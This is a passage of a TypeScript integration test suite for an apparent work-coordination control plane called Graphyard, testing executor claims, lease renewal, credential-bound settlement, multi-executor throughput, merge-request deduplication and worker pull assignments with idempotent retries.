    'an executor that comes back cannot settle the attempt that replaced it, so nothing is executed twice');

  // B reports a failure: the row returns to the queue with the reason and a widening backoff.
  const failed = await engine.settleClaimedAction(executorB, claimed.action!.id, { result: 'failed', reason: 'the reviewer profile has no logged-in account' }, randomUUID());
  assert.equal(failed.action.state, 'pending');
  assert.equal(failed.action.result, 'failed');
  assert.ok(Date.parse(failed.action.retryAt!) > Date.now(), 'a failed attempt backs off before it is offered again');
  assert.equal(claimable(failed.action, new Date()), false);
  assert.equal(claimable(failed.action, new Date(Date.parse(failed.action.retryAt!) + 1)), true);

  // And then completes it. The completed row holds its situation while the verdict lands.
  await store.pool.query(`UPDATE work_items SET document=(document #- '{actionQueue,actions,0,retryAt}') WHERE id=$1`, [item.id]);
  const third = await engine.claimNextAction(executorA, { host: 'host-1', kinds: ['request-review'] }, randomUUID());
  const done = await engine.settleClaimedAction(executorA, third.action!.id, { result: 'done', reason: 'reviewer session launched on head aaaaaaaaaaaa' }, randomUUID());
  assert.equal(done.action.state, 'done');
  assert.equal(done.action.attempts, 3);
  assert.deepEqual(done.action.history.map(entry => entry.event), ['requested', 'claimed', 'reclaimed', 'claimed', 'failed', 'claimed', 'completed']);
  const last = done.action.history.at(-1)!;
  assert.deepEqual([last.requester, last.executor, last.result, last.reason], ['graphyard', executorA.id, 'done', 'reviewer session launched on head aaaaaaaaaaaa']);

  // The ledger carries every transition beside the document that caused it.
  item = await reload(item);
  // The ledger carries each executor transition as its own named event, beside the document the
  // save appends; the control plane's own requests and retirements travel in that document,
  // on the row's history, rather than as a second event nobody reads.
  const forRow = async (kind: string) => (await events(item, kind)).filter(event => event.payload.details.id === claimed.action!.id);
  assert.equal((await forRow('action.claimed')).length, 3);
  assert.equal((await forRow('action.completed')).length, 1);
  assert.equal((await forRow('action.failed')).length, 1);
  const ledger = (await forRow('action.claimed')).at(-1)!;
  assert.deepEqual([ledger.payload.details.kind, ledger.payload.details.executor], ['request-review', executorA.id]);
  assert.deepEqual(ledger.payload.work.actionQueue.actions[0].history.map((entry: { event: string }) => entry.event), ['requested', 'claimed', 'reclaimed', 'claimed', 'failed', 'claimed'],
    'the document the event carries holds the whole transition history of the row');

  // The situation changes: the approval lands, so the row that no longer applies is retired
  // with the reason. The head was proven before its review (GY-115), so nothing else is owed yet.
  item = await engine.observe(item.id, item.revision, observation(item));
  assert.equal(rows(item).length, 0);
  const retired = item.actionQueue!.history.at(-1)!;
  assert.equal(retired.id, claimed.action!.id);
  assert.equal(retired.result, 'done', 'a completed row becomes history untouched when its situation moves on');
});

// ---- The fleet: handlers that stand in for the sessions a real executor launches --------------

interface FleetLog { executed: { executor: string; host: string; id: string; kind: NextActionKind; attempt: number; key: string }[]; idle: number[]; launched: { kind: string; key: string }[] }

/**
 * The master configuration a fleet executor runs under: one worker profile, one reviewer profile
 * and one independent producer profile, exactly as a host that runs `graphyard executor` has.
 */
const fleetConfig = masterConfigSchema.parse({
  version: 1, url: 'https://graphyard.example', credentialFile: '/outside/master.token', cliPath: '/outside/graphyard.mjs',
  repository: 'owner/project', baseBranch: 'main', githubAppId: 15368, hostId: 'host-1', masterAgentName: 'm', herdrWorkspace: 'wF',
  workers: [
    { name: 'claude-worker', principal: worker.id, agentName: 'work-claude', mode: 'launch', kind: 'claude', credentialFile: '/outside/worker.token', approvals: 'auto' },
    { name: 'cursor-worker', principal: otherWorker.id, agentName: 'work-cursor', mode: 'launch', kind: 'cursor', credentialFile: '/outside/worker-2.token', approvals: 'auto' },
  ],
  reviewer: { appId: 4242, installationId: 99, slug: 'graphyard-reviewer', credentialFile: '/outside/reviewer.json', boundAt: '2026-09-01T00:00:00.000Z' },
  reviewers: [{ name: 'claude-reviewer', agentName: 'review-claude', kind: 'claude', approvals: 'auto' }],
  producers: [{ name: 'claude-producer', principal: producer.id, agentName: 'proof-claude', kind: 'claude', credentialFile: '/outside/producer.token', approvals: 'auto' }],
  run: { reviewerProfile: 'claude-reviewer' },
});

/**
 * One stateless executor, running the handlers Graphyard ships (`src/executor.ts`) rather than
 * handlers written for this test. What is stubbed is the outside world each handler reaches —
 * the worker launcher, the reviewer launcher, the producer launcher, the guarded merge and the
 * deployment reading — and each stub does what that session really does to the control plane, so
 * the kind selection, the typed inputs, the session-handle recording and the settle path are all
 * the shipped code. An executor is still configured with nothing but how to claim, how to settle
 * and what it can run.
 */
function fleetExecutor(identity: Principal, host: string, log: FleetLog, mine: Set<string>, options: { escalate?: boolean } = {}): ExecutorEffects {
  const note = async (action: ActionRow) => {
    log.executed.push({ executor: identity.id, host, id: action.id, kind: action.kind, attempt: action.attempts, key: action.key });
    return reload(action.work);
  };
  const launched = (kind: string, item: Work, pane: string) => { log.launched.push({ kind, key: item.key }); return { pane }; };
  const handlers = controlPlaneHandlers(() => fleetConfig, {
    snapshot: async () => ({ work: await store.list(), now: new Date().toISOString() }),
    // The control-plane calls each handler makes, against the engine rather than over HTTP. The
    // provider read behind `resync` is the durable observation job the server runs; the test
    // stands in for GitHub, exactly as it does for the reviewer's verdict.
    mutate: async (path, body) => {
      const [, id, command] = path.split('/');
      const item = await reload(id);
      if (command === 'resync') {
        // A re-read sees the pull request as the provider has it — the checks that have reported,
        // no verdict yet. The approval arrives from the reviewer session the review action starts.
        if (item.submission && item.workspaces.length) await engine.observe(item.id, item.revision, observation(item, { reviews: [] }));
        return engine.resyncWork(identity, id);
      }
      return engine.execute(identity, command as any, id, body, randomUUID());
    },
    agents: () => [],
    workerCredentials: async profiles => Object.fromEntries(profiles.map(profile => [profile.name, { available: true, reason: null }])),
    producerCredentials: async profiles => Object.fromEntries(profiles.map(profile => [profile.name, { available: true, reason: null }])),
    // A worker session: it claims under its own identity, registers its workspace and submits.
    dispatchWorker: async (item, profile) => {
      const actor = profile.principal === otherWorker.id ? otherWorker : worker;
      let claimed = await engine.execute(actor, 'claim', item.id, {}, randomUUID());
      claimed = await engine.execute(actor, 'workspace', claimed.id, { epoch: claimed.epoch, host, path: `/tmp/fleet/${claimed.id}-${claimed.epoch}`, branch: `graphyard/${claimed.key.toLowerCase()}-${claimed.epoch}` }, randomUUID());
      await engine.execute(actor, 'submit', claimed.id, { epoch: claimed.epoch, pr: Number(claimed.key.slice(3)) }, randomUUID());
      return launched('worker', item, 'pane-w');
    },
    // A reviewer session: its verdict reaches Graphyard as a provider observation.
    launchReview: async item => {
      const current = await reload(item.id);
      await engine.observe(current.id, current.revision, observation(current));
      return launched('review', item, 'pane-r');
    },
    // A producer session: it submits evidence for the exact head the request named.
    launchProducer: async (item, request) => {
      const current = await reload(item.id);
      for (const proof of request.proofs ?? []) await engine.execute(producer, 'evidence', current.id, { proof, sha: request.sha, baseSha: request.baseSha, policyRevision: request.policyRevision, result: 'pass', executed: 3, skipped: 0, exercise: { behaviour: 'the change under test', result: 'fail', executed: 1 } }, randomUUID());
      return launched('producer', item, 'pane-p');
    },
    // The shape the guarded broker returns: its own account of what it did, never a verdict that
    // the item is merged — only the observation says that.
    merge: async item => { await mergeItem(identity, await reload(item.id)); return { key: item.key, pr: item.candidate!.pr, sha: item.candidate!.sha, method: 'merge', result: 'merge requested; Graphyard will mark Done only after observing the merge' }; },
    observeDeployment: async delivered => ({ source: 'endpoint', sha: mergeSha, at: new Date().toISOString(), reason: null, deployed: delivered.map(item => item.key), pending: [] }),
    recordSession: (item, handle) => engine.execute(identity, 'session', item.id, handle, randomUUID()),
  });
  // Every handler is wrapped so the log records which executor ran which attempt; nothing else
  // about the shipped handler changes.
  const traced = Object.fromEntries(Object.entries(handlers).map(([kind, handler]) => [kind, async (action: ActionRow, who: { id: string; host: string }) => { await note(action); return handler!(action, who); }]));
  return {
    // Scoped to this test's own items, the way a real executor is scoped to its repository: the
    // control plane still decides what the row is and still settles the race between executors.
    claim: async request => {
      for (const work of mine) {
        const claimed = await engine.claimNextAction(identity, { ...request, work }, randomUUID());
        if (claimed.action) return claimed;
      }
      return { action: null, open: 0 };
    },
    settle: (action, result, reason) => engine.settleClaimedAction(identity, action.id, { result, reason, ...(action.claim?.executor ? { executor: action.claim.executor } : {}) }, randomUUID()),
    handlers: { ...traced, ...(options.escalate ? { escalate: async (action: ActionRow) => { await note(action); return 'escalation resolved'; } } : {}) },
  };
}

/** Take every other open item out of the global merge queue, so one test's queue is its own. */
async function isolateQueue(mine: Set<string>) {
  await store.pool.query("UPDATE work_items SET document=document-'queue' WHERE document->>'stage'<>'done' AND NOT (id = ANY($1::uuid[]))", [[...mine]]);
}

/**
 * Run executors until the queue is drained, sampling the idle-but-actionable set at every step.
 *
 * A tick where every executor finds nothing is not the end: the control plane's reconciliation
 * worker re-evaluates items nothing has mutated (the next candidate in the merge queue, above
 * all), so the drain ticks it and looks once more before concluding.
 */
async function drain(effects: ExecutorEffects[], log: FleetLog, mine: Set<string>, options: { steps?: number } = {}) {
  const budget = options.steps ?? 600;
  const tick = () => Promise.all(effects.map((effect, index) => runExecutorTick({ id: index === 0 ? executorA.id : executorB.id, host: index === 0 ? 'host-1' : 'host-2' }, effect)));
  for (let step = 0; step < budget; step++) {
    const results = await tick();
    const snapshot = (await store.list()).filter(item => mine.has(item.id));
    log.idle.push(idleActionable(snapshot, new Date()).length);
    if (!results.every(result => result.result === 'idle')) continue;
    // The reconciliation pass re-evaluates every item in the database, which re-enqueues items
    // other tests left mid-merge; this test's queue stays its own.
    await isolateQueue(mine);
    await engine.reconcile();
    // A failed attempt waits out a widening backoff before the row is offered again — thirty
    // seconds at its shortest. The fleet really does retry; the test brings that wait forward
    // rather than sleeping through it, so a transient provider conflict costs a step, not a run.
    await store.pool.query("UPDATE work_items SET document=jsonb_set(document,'{actionQueue,actions}',(SELECT coalesce(jsonb_agg(entry - 'retryAt'),'[]'::jsonb) FROM jsonb_array_elements(document->'actionQueue'->'actions') entry)) WHERE id = ANY($1::uuid[]) AND document->'actionQueue'->'actions' <> '[]'::jsonb", [[...mine]]);
    if ((await tick()).every(result => result.result === 'idle')) return step;
  }
  throw new Error('the queue did not drain within the step budget');
}

const emptyLog = (): FleetLog => ({ executed: [], idle: [], launched: [] });

test('integration:action-queue-leases — a claim binds to the credential as well as the executor name: an executor whose identity differs from its principal settles once, and nobody else settles for it', async () => {
  const item = await release(await created());
  await engine.reconcile();
  const open = rows(await reload(item)).find(entry => entry.kind === 'dispatch')!;
  assert.ok(open, 'the item has a dispatch row to claim');

  // Several executors behind one coordinator credential is the documented deployment: each names
  // itself, and the credential is the same. The settlement must carry the executor name, or the
  // control plane refuses it *after* the handler has already run — the claim expires, the row is
  // offered again, and the action runs twice. That is what the shipped HTTP binding prevents.
  const ran: string[] = [];
  const handlers = { dispatch: async () => { ran.push('dispatch'); return 'launched a worker session'; } };
  const bound = executorEffects({ url, token: 'x'.repeat(32) }, handlers);
  const identity = { id: 'runner-7', host: 'host-9' };
  assert.notEqual(identity.id, executorA.id, 'the executor identity is not the credential principal');
  const step = await runExecutorTick(identity, { ...bound, claim: request => bound.claim({ ...request, kinds: ['dispatch'], work: item.id } as any) });
  assert.equal(step.result, 'done', step.reason);
  assert.deepEqual(ran, ['dispatch'], 'the handler ran once');
  const settled = rows(await reload(item)).find(entry => entry.id === step.action!.id) ?? (await reload(item)).actionQueue!.history.find(entry => entry.id === step.action!.id)!;
  assert.equal(settled.state, 'done', 'the settlement was accepted, so the row is not offered again');
  assert.equal(settled.attempts, 1, 'the action was executed exactly once');
  assert.equal(settled.history.at(-1)!.executor, 'runner-7');
  assert.equal(settled.claim, null);

  // The same row, claimed under one credential, cannot be settled by another that names the same
  // executor: the identity is self-asserted, the credential is not.
  const second = await release(await created());
  await engine.reconcile();
  const claimed = await engine.claimNextAction(executorA, { host: 'host-1', executor: 'runner-7', work: second.id }, randomUUID());
  assert.ok(claimed.action, 'the row was claimed');
  assert.equal(claimed.action!.claim!.principal, executorA.id, 'the claim records the credential as well as the name');
  await assert.rejects(engine.settleClaimedAction(executorB, claimed.action!.id, { executor: 'runner-7', result: 'done', reason: 'not mine to settle' }, randomUUID()),
    /was claimed with the credential of executor-a/);
  // And the executor that does hold it settles normally.
  const mine = await engine.settleClaimedAction(executorA, claimed.action!.id, { executor: 'runner-7', result: 'done', reason: 'launched' }, randomUUID());
  assert.equal(mine.action.state, 'done');
});

test('integration:action-queue-leases — a handler that outlives its claim holds the row by renewing it, and one that stops renewing loses it to the next executor', async () => {
  // A claim is a short lease so a dead executor's row is offered again quickly. The handlers are
  // not short: a dispatch prepares a worktree and waits on a runtime, and a guarded merge chains
  // provider calls that each have their own timeout. Without a renewal a handler that outlives
  // its lease is run a second time by another executor while the first is still inside it.
  assert.ok(actionRenewIntervalMs * 2 < actionClaimMs, 'a renewal may be lost and the next one still arrives inside the lease');

  const item = await release(await created());
  await engine.reconcile();
  const claimed = await engine.claimNextAction(executorA, { host: 'host-1', executor: 'slow-1', leaseSeconds: 10, work: item.id }, randomUUID());
  assert.ok(claimed.action, 'the row was claimed');
  // Only the executor named on the claim, holding the credential it was claimed with, may renew.
  await assert.rejects(engine.renewClaimedAction(executorA, claimed.action!.id, { executor: 'someone-else' }), /claimed by slow-1/);
  await assert.rejects(engine.renewClaimedAction(executorB, claimed.action!.id, { executor: 'slow-1' }), /credential of executor-a/);
  const renewed = await engine.renewClaimedAction(executorA, claimed.action!.id, { executor: 'slow-1' });
  assert.ok(Date.parse(renewed.action.claim!.expiresAt) > Date.parse(claimed.action!.claim!.expiresAt), 'the claim holds for another lease');
  assert.equal(renewed.action.claim!.renewals, 1);
  assert.equal(renewed.action.attempts, 1, 'a renewal is not a further attempt');
  assert.equal((await reload(item)).actionQueue!.actions[0].claim!.renewals, 1, 'and it is durable');

  // The loop, against the shipped queue model: a handler that runs for longer than its lease,
  // renewing while it does. The clock is real and the lease is scaled down; what is measured is
  // that the row is never offered to a second executor while the first is still running it.
  const document = await reload(item);
  // The row as the control plane wrote it, back on offer with this test's own attempt count.
  Object.assign(document.actionQueue!.actions[0], { state: 'pending', claim: null, attempts: 0, history: [] });
  const fleet = [document];
  // Scaled down so the case is quick, but wide enough that a loaded runner pausing between
  // renewals does not decide the outcome: three renewals fit inside every lease.
  const leaseMs = 300;
  let renewals = 0;
  const holding: ExecutorEffects = {
    claim: async request => ({ action: claimAction(fleet, { id: request.executor, host: request.host, principal: executorA.id }, new Date(), { kinds: request.kinds, leaseMs })?.row ?? null }),
    renew: async action => { renewals++; return renewClaim(document, action.id, { executor: 'slow-1', principal: executorA.id }, new Date(), leaseMs); },
    settle: async (action, result, reason) => settleAction(document, action.id, { executor: 'slow-1', principal: executorA.id }, result, reason, new Date()),
    handlers: { dispatch: async () => { await delay(6 * leaseMs); return 'launched a worker session after a long wait'; } },
  };
  const running = runExecutorTick({ id: 'slow-1', host: 'host-9' }, holding, Date.now, { renewIntervalMs: Math.floor(leaseMs / 4) });
  await delay(3 * leaseMs);
  assert.equal(claimAction(fleet, { id: 'thief', host: 'host-2', principal: executorB.id }, new Date(), { kinds: ['dispatch'] }), null,
    'the row is not offered to a second executor while the first is still inside its handler');
  const step = await running;
  assert.equal(step.result, 'done', step.reason);
  assert.ok(renewals >= 2, `the executor held its claim by renewing (${renewals} renewals)`);
  const settled = document.actionQueue!.actions[0];
  assert.equal(settled.state, 'done'); assert.equal(settled.attempts, 1, 'the action was executed exactly once');
  assert.equal(settled.history.filter(entry => entry.event === 'claimed').length, 1, 'and claimed exactly once');

  // The same handler without a renewal is the failure this prevents: the lease runs out, another
  // executor takes the row, and the first cannot settle what it has already run.
  const alone = structuredClone(document);
  alone.actionQueue!.actions[0].state = 'pending'; alone.actionQueue!.actions[0].claim = null; delete alone.actionQueue!.actions[0].retryAt; delete alone.actionQueue!.actions[0].resolvedAt; alone.actionQueue!.actions[0].result = undefined;
  const unheld: ExecutorEffects = { ...holding, renew: undefined,
    claim: async request => ({ action: claimAction([alone], { id: request.executor, host: request.host, principal: executorA.id }, new Date(), { kinds: request.kinds, leaseMs })?.row ?? null }),
    settle: async (action, result, reason) => settleAction(alone, action.id, { executor: 'slow-1', principal: executorA.id }, result, reason, new Date()) };
  const unheldRun = runExecutorTick({ id: 'slow-1', host: 'host-9' }, unheld);
  await delay(2 * leaseMs);
  assert.ok(claimAction([alone], { id: 'thief', host: 'host-2', principal: executorB.id }, new Date(), { kinds: ['dispatch'] }), 'an executor that renews nothing loses its row');
  const lost = await unheldRun;
  assert.equal(lost.result, 'failed');
  assert.match(lost.reason, /claimed by thief|claim expired/);

  // The shipped HTTP binding speaks the renewal route, naming the executor the claim was made under.
  const calls: { path: string; body: any }[] = [];
  const bound = executorEffects({ url: 'https://graphyard.example', token: 'executor-token', requestId: () => 'request-1',
    fetcher: (async (input: any, init: any) => { calls.push({ path: String(input), body: JSON.parse(init.body) }); return new Response(JSON.stringify({})); }) as unknown as typeof fetch }, { dispatch: async () => 'launched' });
  await bound.renew!({ id: 'b'.repeat(32), claim: { executor: 'runner-7' } } as ActionRow);
  assert.deepEqual(calls, [{ path: `https://graphyard.example/api/actions/${'b'.repeat(32)}/renew`, body: { executor: 'runner-7' } }]);
});

// ---- AC-3: two stateless executors on different hosts ----------------------------------------

test('integration:multi-executor-throughput — two executors on different hosts drive five items to delivery through the same queue, with no double execution, no starvation and no master session', async () => {
  const items: Work[] = [];
  for (let index = 0; index < 5; index++) items.push(await release(await created()));
  const mine = new Set(items.map(item => item.id));
  await isolateQueue(mine);
  const log = emptyLog();
  const a = fleetExecutor(executorA, 'host-1', log, mine), b = fleetExecutor(executorB, 'host-2', log, mine);
  // The whole of an executor's configuration: how to claim, how to settle, and what it can run.
  assert.deepEqual(Object.keys(a).sort(), ['claim', 'handlers', 'settle'], 'an executor holds no snapshot, no cursor and no peer list');
  // Exactly the kinds src/executor.ts ships a handler for; nothing in this test adds one.
  assert.deepEqual(executorKinds(a.handlers).sort(), ['approve-scope', 'dispatch', 'merge', 'reclaim', 'request-review', 'resync', 'verify-deployment'].sort());
  assert.equal(judgmentInExecutorLoop(a.handlers), null, 'no judgment is made inside the loop');

  await drain([a, b], log, mine);

  for (const item of items) {
    const delivered = await reload(item);
    assert.equal(delivered.stage, 'done', `${delivered.key} reached delivery`);
    assert.ok(delivered.delivery?.mergeSha, `${delivered.key} has a delivery snapshot`);
  }
  // No double execution: every (action, attempt) pair was run once, and no action id was run
  // twice by two executors. The claim is what makes that true, not a convention between them.
  const pairs = log.executed.map(entry => `${entry.id}:${entry.attempt}`);
  assert.equal(new Set(pairs).size, pairs.length, 'no action attempt ran twice');
  for (const [id, runs] of Object.entries(groupBy(log.executed, entry => entry.id))) {
    const executors = new Set(runs.map(entry => entry.executor));
    assert.equal(executors.size <= 1 || runs.length > 1, true, `action ${id} was never run concurrently by two executors`);
  }
  // No starvation: both executors did work, on both hosts, and every item was advanced by both.
  const byExecutor = groupBy(log.executed, entry => entry.executor);
  assert.deepEqual(Object.keys(byExecutor).sort(), [executorA.id, executorB.id]);
  assert.ok(byExecutor[executorA.id].length > 1 && byExecutor[executorB.id].length > 1, 'neither executor was starved');
  assert.deepEqual([...new Set(log.executed.map(entry => entry.host))].sort(), ['host-1', 'host-2']);
  for (const item of items) assert.ok(log.executed.some(entry => entry.key === item.key), `${item.key} was executed by the fleet`);
  assert.ok(new Set(log.executed.map(entry => entry.key)).size === items.length);
  // The launchers the shipped handlers reached: a worker session, a reviewer session and a
  // producer session per item. Nothing in the loop implemented, reviewed or proved anything.
  for (const kind of ['worker', 'review', 'producer']) assert.equal(log.launched.filter(entry => entry.kind === kind).length >= items.length, true, `every item had its ${kind} session launched`);
  // Every launched session left a durable handle on its item, recorded by the handler itself.
  for (const item of items) {
    const handles = (await reload(item)).sessions ?? [];
    assert.deepEqual([...new Set(handles.map(handle => handle.kind))].sort(), ['implementation', 'proof', 'review'], `${item.key} records a handle per launched session`);
    for (const handle of handles) assert.match(attachCommand(handle), /^herdr pane attach pane-[wrp]/, 'each handle carries the command that attaches to that pane');
    for (const handle of handles) assert.equal(handle.workspace, fleetConfig.herdrWorkspace, 'and the workspace the executor launched it into');
  }

  // No master session was involved: the only coordinator identities that acted are the two
  // executors, each one settling rows it claimed, and no daemon cycle ran.
  const actors = new Set<string>();
  for (const item of items) for (const event of await store.events(item.id)) actors.add(String(event.actor));
  assert.deepEqual([...actors].sort(), ['agent-a', 'ci-runner', 'executor-a', 'executor-b', 'github', 'graphyard', 'operator'].filter(actor => actors.has(actor)));
  assert.ok(!actors.has('master'), 'nothing a master session does appears in the ledger');
  const queue = queueSnapshot((await store.list()).filter(item => mine.has(item.id)), new Date());
  assert.equal(queue.pending, 0); assert.equal(queue.claimed, 0);
  // Nothing was left idle but actionable at any step of the drain, and no open item was without a
  // computed action: there is no situation in the run the loop had no step for, which is the
  // property that used to need a person watching.
  assert.equal(Math.max(...log.idle), 0, 'no row waited past the idle bound while the fleet worked');
  const unnamed = (await store.list()).filter(item => mine.has(item.id))
    .filter(item => item.stage !== 'done' && !item.nextAction && !item.lease && !item.dependencies.length && item.ready && !item.blocker && !item.queue);
  assert.deepEqual(unnamed.map(item => item.key), [], 'no open, unassigned, unblocked item lacked a typed next action');
});

test('integration:multi-executor-throughput — the poll every executor runs on carries no ledger reconstruction, so a fleet that polls harder never pays for one', async () => {
  // The timeline catch-up walks an item's own ledger, page by page, to rebuild what it did before
  // the per-item timeline existed. It belongs to the read its output is for — master status,
  // which derives every speed report from whole documents — and not to the coordination view,
  // which is what the cycle, the dispatcher and every stateless executor ask for every few
  // seconds. Riding that view, a reconstruction sits in front of every claim, and the more
  // executors join the queue the more often it is paid for.
  const item = await submitted();
  resetPipelineBackfillState();
  const executorToken = { Authorization: `Bearer ${'x'.repeat(32)}` };
  for (let poll = 0; poll < 3; poll++) {
    const view = await fetch(`${url}/api/work-snapshot`, { headers: { ...executorToken, [coordinationViewHeader]: 'coordination' } }).then(response => response.json());
    assert.equal(view.view, 'coordination');
    assert.ok(view.work.some((entry: Work) => entry.id === item.id));
  }
  assert.equal(pipelineBackfillState().lastRun, null, 'no executor poll walked a ledger');
  assert.equal(pipelineBackfillState().backfilled, 0);
  assert.equal((await reload(item)).pipeline?.backfill, undefined, 'and none of them wrote a reconstruction');
  // The read the reconstruction is for — the default, bounded snapshot (GY-422) — still runs it, so the speed reports converge as before.
  const full = await fetch(`${url}/api/work-snapshot`, { headers: executorToken }).then(response => response.json());
  assert.equal(full.view, 'bounded');
  assert.ok(pipelineBackfillState().lastRun!.backfilled > 0, 'the full read still reconstructs what is pending');
});

test('integration:multi-executor-throughput — every executor requests merges under its own instance, and one candidate carries one merge request whoever records it, so GitHub performs exactly one merge', async () => {
  // GitHub executes merges (GY-258): the merge step records a request that GitHub merge exactly
  // this candidate, and no executor holds an execution another could resume or strand. Two
  // executors under one credential are still told apart by instance (GY-92) on the request.
  const first = executorMergeExecutor(executorA.id), second = executorMergeExecutor(executorA.id);
  assert.equal(first.principal, executorA.id);
  assert.notEqual(first.instance, second.instance, 'each executor process mints its own instance');
  assert.match(first.instance, /^executor-/);

  const item = await submitted();
  await engine.execute(producer, 'evidence', item.id, { proof: PROOF, sha: head, baseSha: base, policyRevision: item.policyRevision, result: 'pass', executed: 3, skipped: 0, exercise: { behaviour: 'the change under test', result: 'fail', executed: 1 } }, randomUUID());
  // One item in the merge queue, so what this case measures is ownership and not a queue position.
  await isolateQueue(new Set([item.id]));
  let current = await engine.observe(item.id, (await reload(item)).revision, observation(await reload(item)));
  await engine.reconcile();
  current = await publishTip(await reload(current));
  current = await engine.observe(current.id, current.revision, observation(current));
  const bound = { enqueue: true as const, expectedRevision: current.revision, sha: head, baseSha: base, policyRevision: current.policyRevision };
  const granted = await engine.requestEnqueue(executorA, current.id, { ...bound, executor: first.instance }, randomUUID());
  assert.equal(granted.enqueue.requestedBy, `${executorA.id}#${first.instance}`, 'the request names the executor instance, not only its principal');
  // The second executor asking for the same candidate gets the standing request back, not a second one.
  const again = await engine.requestEnqueue(executorA, current.id, { ...bound, executor: second.instance }, randomUUID());
  assert.deepEqual(again.enqueue, granted.enqueue);
  const requests = (await store.pool.query("SELECT count(*)::int AS n FROM events WHERE work_id=$1 AND kind='merge.enqueue.requested'", [current.id])).rows[0].n;
  assert.equal(requests, 1, 'one candidate carries one merge request');
  // Nothing is held, so no executor stands down from another's merge: each may re-request it.
  const held = await reload(current);
  assert.equal(held.mergeExecution ?? null, null, 'no merge execution is issued');
  assert.doesNotThrow(() => assertMergeCandidate(held, new Date().toISOString()));
});

// ---- AC-4: workers pull -----------------------------------------------------------------------

test('integration:worker-pull-model — a free worker asks the control plane for its next assignment, p90 ready-to-claim stays inside two minutes, and nothing tracks runtime health', async () => {
  const offered: Work[] = [];
  for (let index = 0; index < 4; index++) offered.push(await release(await engine.execute(operator, 'create', null, { title: `Pull ${index}`, priority: index === 0 ? 0 : 3, plannedFiles: [`src/pull-${index}/`], criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID())));

  // The pull: one call, one credential, no configuration. `agent-b` appears in no master profile
  // and no Herdr inventory; the control plane still hands it the work it is entitled to claim.
  const assigned: Work[] = [];
  for (const actor of [worker, otherWorker, worker, otherWorker]) {
    const pulled = await engine.pullAssignment(actor, {}, randomUUID());
    assert.ok(pulled.assigned, 'a free worker that asks is given an assignment');
    assigned.push(pulled.assigned!);
    assert.equal(pulled.assigned!.lease!.owner, actor.id, 'the worker claims under its own identity');
  }
  assert.equal(new Set(assigned.map(item => item.id)).size, assigned.length, 'no item was handed to two workers');
  // The offer order is the dispatch order the control plane already uses: priority, then the
  // narrowest planned scope, then age. Nothing about worker liveness enters into it.
  // Earlier tests leave dispatchable items of their own (planned-file overlap no longer holds them);
  // among this test's items, the highest priority is offered first.
  assert.equal(assigned.filter(item => offered.some(entry => entry.id === item.id))[0].priority, 0, 'the highest priority item is offered first');
  for (const item of assigned) await engine.execute(item.lease!.owner === worker.id ? worker : otherWorker, 'release', item.id, { epoch: item.lease!.epoch }, randomUUID());

  // An item another worker already holds is never offered twice: a racing pull skips it.
  const contested = await release(await engine.execute(operator, 'create', null, { title: 'Contested', plannedFiles: ['src/contested/'], criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const [first, second] = await Promise.all([engine.pullAssignment(worker, { work: contested.id }, randomUUID()), engine.pullAssignment(otherWorker, { work: contested.id }, randomUUID())]);
  const winners = [first, second].filter(result => result.assigned);
  assert.equal(winners.length, 1, 'the coordination lock decides the race; the loser is told nothing was left');
  assert.equal(winners[0].assigned!.id, contested.id);
  await engine.execute(winners[0].assigned!.lease!.owner === worker.id ? worker : otherWorker, 'release', contested.id, { epoch: winners[0].assigned!.lease!.epoch }, randomUUID());

  // A pull that timed out after its claim committed is retried with the same key: it replays the
  // claim it already made. Without that the retry would take a second item and the worker would
  // hold a lease it was never told about, until it lapsed into a reclaim.
  const replayable = await release(await engine.execute(operator, 'create', null, { title: 'Replayed pull', plannedFiles: ['src/replay/'], criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const alsoOffered = await release(await engine.execute(operator, 'create', null, { title: 'Second offer', plannedFiles: ['src/replay-2/'], criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const retryKey = randomUUID();
  const won = await engine.pullAssignment(worker, {}, retryKey);
  assert.ok(won.assigned, 'the pull claimed an item');
  const heldAfterPull = (await store.list()).filter(entry => entry.lease?.owner === worker.id).map(entry => entry.id).sort();
  const replayed = await engine.pullAssignment(worker, {}, retryKey);
  assert.equal(replayed.assigned!.id, won.assigned!.id, 'the retry returns the assignment the first call made');
  assert.equal((replayed as any).replayed, true);
  const heldAfterRetry = (await store.list()).filter(entry => entry.lease?.owner === worker.id).map(entry => entry.id).sort();
  assert.deepEqual(heldAfterRetry, heldAfterPull, 'the retry took no second item');
  assert.ok(heldAfterPull.includes(won.assigned!.id));
  for (const item of [replayable, alsoOffered]) {
    const current = await reload(item);
    if (current.lease) await engine.execute(worker, 'release', current.id, { epoch: current.lease.epoch }, randomUUID());
  }

  // One key can only ever claim one item, including when the retry races the call it is retrying:
  // the claim and its receipt are written in one transaction, so whichever reaches an offer first
  // wins and the other replays that assignment instead of taking a second.
  const raced = await release(await engine.execute(operator, 'create', null, { title: 'Raced pull', plannedFiles: ['src/raced/'], criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const alsoRaced = await release(await engine.execute(operator, 'create', null, { title: 'Raced pull 2', plannedFiles: ['src/raced-2/'], criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const racedKey = randomUUID();
  const [one, two] = await Promise.all([engine.pullAssignment(worker, { work: raced.id }, racedKey), engine.pullAssignment(worker, { work: alsoRaced.id }, racedKey)]);
  const assignments = [one, two].filter(result => result.assigned);
  assert.equal(assignments.length, 2, 'both calls answered with the assignment this pull made');
  assert.equal(one.assigned!.id, two.assigned!.id, 'and it is the same one; the key claimed a single item');
  const heldAfterRace = (await store.list()).filter(entry => [raced.id, alsoRaced.id].includes(entry.id) && entry.lease?.owner === worker.id);
  assert.deepEqual(heldAfterRace.map(entry => entry.id), [one.assigned!.id], 'the worker holds exactly the item it was told about, never the other offer as well');
  await engine.execute(worker, 'release', one.assigned!.id, { epoch: heldAfterRace[0].lease!.epoch }, randomUUID());

  // The shipped worker is what makes that replay reachable: one key, held across every transport
  // retry. A retry under a fresh key after a timeout would take a second item instead.
  const keys: string[] = [];
  let attempts = 0;
  const flaky = async (key: string) => {
    keys.push(key);
    if (++attempts < 2) throw Object.assign(new Error('The operation was aborted due to timeout'), { name: 'TimeoutError' });
    return { assigned: { key: 'GY-1' }, offered: 1, refused: [], replayed: true };
  };
